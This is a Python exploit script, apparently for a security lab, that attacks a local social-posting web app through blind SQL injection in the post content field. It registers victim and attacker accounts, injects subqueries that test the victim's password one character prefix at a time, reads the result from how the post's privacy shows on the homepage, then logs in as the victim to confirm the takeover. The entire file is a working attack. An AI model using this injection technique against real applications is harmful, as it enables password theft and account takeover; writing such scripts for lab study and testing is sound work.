#!/usr/bin/env python3
import requests, sys, re, string, random
from interface import *
from bs4 import BeautifulSoup

if not (2 == len(sys.argv)):
    print(f"Usage: {__file__} server_url")
    sys.exit(-1)

url = sys.argv[1]

chars = string.digits + string.ascii_uppercase + string.ascii_lowercase
def random_password(length):
    return ''.join(random.choice(chars) for i in range(length))

def check(html, num_posts):
    # soup = BeautifulSoup(html, 'html.parser')
    # posts = soup.find_all("div")[11:] # From idx 11 we only got posts
    # print(soup.prettify())
    start = html.index(f"Post #{num_posts}")
    assert start != -1 # make sure new post exists

    end = html[start:].index(")") # find first ")" after start
    content = html[start:start+end+1]
    assert "Friends" not in content # If friends, SQL did not work
    return "Public" in content # If public, query succeeded. Else False


def try_login(username, password):
    tmp_s = requests.Session()
    r = login(tmp_s, url, username=username, password=password, logging=False)
    return "Username or Password are invalid" not in r.text


def try_pass(s, victim, num_posts, prefix):
    found = False
    for c in chars:
        new = prefix + c
        privacy = "Friends"
        payload = f'''Post #{num_posts + 1}', (
        SELECT "Public" FROM Users
        WHERE (
            username = '{victim}'
        AND substr(password, 1, {len(new)}) = '{new}'
        )
        UNION
        SELECT "Private" FROM Users
        WHERE NOT (
            username = '{victim}'
        AND substr(password, 1, {len(new)}) = '{new}'
        )
        LIMIT 1
        ))#'''
        # print(f"Attempt #{str(num_posts).zfill(3)}: {new}")
        homepage = create_post(s, url, content=payload, privacy=privacy, logging=False)
        num_posts += 1
        if check(homepage.text, num_posts): # prefix succeeded
            print(f"[+] Attempt #{str(num_posts).zfill(3)}: Found new valid prefix ({new})")

            # test if new prefix is the password
            if try_login(victim, new):
                return new

            # we just want the first valid prefix.
            # no need to search for more characters
            # in this position
            return try_pass(s, victim, num_posts, new)

    return False
        

s1 = requests.Session()
reset_app(s1, url)

# register victim with random password
victim_username="victim"
victim_password=random_password(16)

sv = requests.Session()
register(sv, url, username=victim_username, password=victim_password)

# register attacker
attacker_username = 'attacker'
attacker_password = 'attacker'
sa = requests.Session()
register(sa, url, username=attacker_username, password=attacker_password)

# create new post
num_posts = 4
found_password = try_pass(sa, victim_username, num_posts, "")

# server's = is case insensitive.........................
assert found_password and found_password.lower() == victim_password.lower()

# check that we can login with found password
logout(sa, url)
login(sa, url, username=victim_username, password=found_password)
r = get_profile(sa, url)
soup = BeautifulSoup(r.text, 'html.parser')
inp = soup.find(id="usernameInput") # usernameInput field will have username placeholder
assert soup.find(id="usernameInput")['placeholder'] == victim_username

print(f"[+] Successfully found victim's password!")
    
